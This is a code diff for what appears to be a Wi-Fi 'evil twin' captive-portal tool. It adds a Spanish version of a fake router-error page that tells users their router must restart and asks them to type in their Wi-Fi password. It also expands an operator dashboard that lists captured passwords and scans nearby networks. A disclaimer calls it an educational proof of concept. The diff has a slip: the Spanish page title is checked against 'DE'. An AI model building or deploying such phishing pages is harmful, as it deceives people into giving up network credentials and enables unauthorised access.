@@ -9,10 +9,10 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Portal";
+#define SSID_NAME "Portal"
 
 // Init system settings
-const byte DNS_PORT = 53; //Port for the DNS Server
+#define DNS_PORT 53 //Port for the DNS Server
 IPAddress APIP(192, 168, 1, 1); // Gateway
 
 String allPass = ""; //Contains all Passwords 
@@ -80,11 +80,6 @@ String indexCSS(){ //CSS of the Index Page
   _html += "margin: 0;";
   _html += "font-size: 18px;}";
   
-  _html += "#routerRestartForm {";
-  _html += "display: flex;";
-  _html += "flex-direction: column;";
-  _html += "margin-top: 20px;}";
-  
   _html += "label {";
   _html += "display: block;";
   _html += "margin-bottom: 10px;";
@@ -105,6 +100,7 @@ String indexCSS(){ //CSS of the Index Page
   _html += "padding: 10px 20px;";
   _html += "border-radius: 5px;";
   _html += "cursor: pointer;";
+  _html += "margin-top: 20px;";
   _html += "font-size: 18px;}";
   
   _html += "button:hover {";
@@ -117,7 +113,13 @@ void fixing(){
   String _html = "";
 
   _html += "<meta charset=\"UTF-8\">";
-  _html += "<title>Router-Fehler</title>";
+
+  _html += "<title>";
+  if (indexLang == "DE"){_html += "Router wird Neugestartet";}
+  if (indexLang == "EN"){_html += "Router is restarting";}
+  if (indexLang == "SP"){_html += "El router se reinicia";}
+  _html += "</title>";
+  
   _html += favicon;
   _html += "<style>" + indexCSS();
   _html += "</style>";
@@ -137,6 +139,11 @@ void fixing(){
     _html += "<h1 class='center'>The Router is Restarting</h1>";
     _html += "<p>The router will now restart - this process may take a few minutes.</p>";
     _html += "<p>We thank you for your patience and hope that this solved the problems.</p>";}
+
+    if (indexLang == "SP"){
+    _html += "<h1 class='center'>El router se está reiniciando</h1>";
+    _html += "<p>El router se reiniciará - este proceso puede tardar unos minutos.</p>";
+    _html += "<p>Le agradecemos su paciencia y esperamos que esto haya resuelto los problemas.</p>";}
     
   _html += "</div>";
   _html += "</body></html>";
@@ -149,7 +156,13 @@ void Index(){
 
   _html ="<!DOCTYPE html><html><head>";
   _html += "<meta charset=\"UTF-8\">";
-  _html += "<title>Router-Fehler</title>";
+  _html += "<title>";
+
+  if (indexLang == "DE"){_html += "Router-Fehler";}
+  if (indexLang == "EN"){_html += "Router-ERROR";}
+  if (indexLang == "DE"){_html += "Error del router";}
+  
+  _html += "</title>";
   _html += favicon;
   _html += "<style>" + indexCSS();
   _html += "</style>";
@@ -167,9 +180,9 @@ void Index(){
     _html += "<p>Um den Router neu zu starten und das Problem zu beheben, benötigen Sie das Wi-Fi-Passwort, um sicherzustellen, dass nur autorisierte Benutzer Zugriff auf Ihr Netzwerk haben. Das Wi-Fi-Passwort schützt Ihr Netzwerk vor unbefugtem Zugriff und schützt Ihre persönlichen Daten.</p>";
     _html += "<p>Bitte geben Sie das Wi-Fi-Passwort in das unten stehende Feld ein und klicken Sie auf \"Router neu starten\". Dadurch wird der Router neu gestartet, und die meisten Probleme sollten behoben sein.</p>";
     _html += "<p>Wenn Sie das Wi-Fi-Passwort nicht kennen oder es verloren haben, finden Sie es normalerweise auf einem Etikett auf der Rückseite Ihres Routers. Wenn Sie weiterhin Probleme haben, wenden Sie sich an Ihren Internetdienstanbieter oder den Hersteller Ihres Routers.</p>";
-    _html += "<form id=\"routerRestartForm\" action=\"/post\">";
-    _html += "<input type=\"password\" placeholder=\"Wi-Fi-Passwort\" id=\"wifiPassword\" name=\"wifiPassword\" minlength=\"8\" required>";
-    _html += "<button type='submit' id=\"restartButton\">Router neu starten</button>";
+    _html += "<form action=\"/post\">";
+    _html += "<input type=\"password\" placeholder=\"Wi-Fi-Passwort\" name=\"wifiPassword\" minlength=\"8\" required>";
+    _html += "<button type='submit'>Router neu starten</button>";
     _html += "</form>";
   }
 
@@ -180,9 +193,22 @@ void Index(){
     _html += "<p>To restart the router and fix the problem, you will need the Wi-Fi password to ensure that only authorized users have access to your network. The Wi-Fi password protects your network from unauthorized access and protects your personal information.</p>";
     _html += "<p>Please enter the Wi-Fi password in the field below and click \"Restart Router\". This will restart the router and most problems should be resolved.</p>";
     _html += "<p>If you don't know the Wi-Fi password or have lost it, you can usually find it on a label on the back of your router. If you continue to have problems, contact your Internet service provider or your router manufacturer.</p>";
-    _html += "<form id=\"routerRestartForm\" action=\"/post\">";
-    _html += "<input type=\"password\" placeholder=\"Wi-Fi-Password\" id=\"wifiPassword\" name=\"wifiPassword\" minlength=\"8\" required>";
-    _html += "<button type='submit' id=\"restartButton\">Restart Router</button>";
+    _html += "<form action=\"/post\">";
+    _html += "<input type=\"password\" placeholder=\"Wi-Fi-Password\" name=\"wifiPassword\" minlength=\"8\" required>";
+    _html += "<button type='submit'>Restart Router</button>";
+    _html += "</form>";
+  }
+
+  if (indexLang == "SP"){
+    _html += "<h1 class='center'>Error del router</h1>";
+    _html += "<p>Se ha detectado un problema con su router, requiere que sea reiniciado</p>";
+    _html += "<p>Esto puede ser necesario por varias razones, tales como: Actualizaciones de seguridad o mejoras de rendimiento.</p>";
+    _html += "<p>Para reiniciar el router y solucionar el problema, necesitarás la contraseña Wi-Fi para asegurarte de que sólo los usuarios autorizados tienen acceso a tu red. La contraseña Wi-Fi protege tu red de accesos no autorizados y protege tu información personal.</p>";
+    _html += "<p>Por favor, introduzca la contraseña Wi-Fi en el campo de abajo y haga clic en \"Reiniciar Router\". Esto reiniciará el router y la mayoría de los problemas deberían resolverse.</p>";
+    _html += "<p>Si no conoce la contraseña Wi-Fi o la ha perdido, normalmente podrá encontrarla en una etiqueta situada en la parte posterior del router. Si sigues teniendo problemas, ponte en contacto con tu proveedor de servicios de Internet o con el fabricante del router.</p>";
+    _html += "<form action=\"/post\">";
+    _html += "<input type=\"password\" placeholder=\"Contraseña Wi-Fi\" name=\"wifiPassword\" minlength=\"8\" required>";
+    _html += "<button type='submit'>Reiniciar Router</button>";
     _html += "</form>";
   }
     
@@ -352,20 +378,34 @@ void handleDashboard() {
   _html += "border-left: solid "+ acColor +" 8px;";
   _html += "font-weight: 100;";
   _html += "padding-left: 9px; }";
+
+  _html += ".spacer {border: 0; border-top: 1px solid #5d5d5d;";
+
+  _html += ".hrefLink, a, a:link, a:visited {color: red; text-decoration: none;}";
+  
   _html += "</style>";
   
   _html += "<body>";
   _html += "<div class=\"content\">";
   _html += "<h1 style=\"padding: 0.2em 0.1em; text-align: center; font-size: 2.5rem;\">Captive Portal Dashboard</h1>";
 
-  _html += "<h1>Language: "+ indexLang +"</h1>";
+  _html += "<p><span style='color: red;'>INFO:<br></span><span>- This project is a proof of concept for testing and educational purposes<br>- Use it only against your own networks and devices!<br>- Credits to: Spacehuhn, adamff-dev and sankethj<br>- Made by HEINZGUENTER</span></p>";
+
+  _html += "<div>";
+  _html += "<h1>Settings</h1>";
+
+  _html += "<div class='button-container'>";
+  _html += "<h2>Language: "+ indexLang +"</h2>";
   _html += "<form action='/language' methode='post'><select name='lang'>";
-  _html += "<option value='' disabled selected>Choose</option><option value='DE'>DE</option><option value='EN'>EN</option>";
+  _html += "<option value='' disabled selected>Choose</option><option value='DE'>DE</option><option value='EN'>EN</option><option value='SP'>SP</option>";
   _html += "</select><input type=submit value='Change'></form>";
+  _html += "</div><hr class='spacer'>";
 
-  _html += "<h1>Current SSID: "+ currentSSID + "</h1>";
+  _html += "<div class='button-container'>";
+  _html += "<h2>SSID: "+ currentSSID + "</h2>";
   _html += "<form><input style='text-align: left; text-transform: uppercase;' type=text placeholder='New SSID' name=ssid></input><input type=submit value=Change SSID action='/?ssid={"+ input("ssid") + "}'></form>";
-
+  _html += "</div></div>";
+  
   _html += "<div class='button-container'>";
   _html += "<h1 style='padding-right: 7rem;'>Captured Passwords</h1>";
   _html += "<form style='display:inline-block;' method='post' action='/clearPass'><button style='display:inline-block;'>Delete Passwords</button></form>";
@@ -394,12 +434,11 @@ void handleDashboard() {
   //scan and display nearby networks
   int numNetworks = WiFi.scanNetworks();
   for (int i = 0; i < numNetworks; i++) {
-    _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + ";'>" + WiFi.RSSI(i) + "</td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
+    _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + "'>" + WiFi.RSSI(i) + "</td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
   }
   _html += "</tbody></table>";
   _html += "</div>";
-  _html += "</body>";
-  _html += "</html>";
+  _html += "</body></html>";
 
   webServer.send(200, "text/html", _html);
 
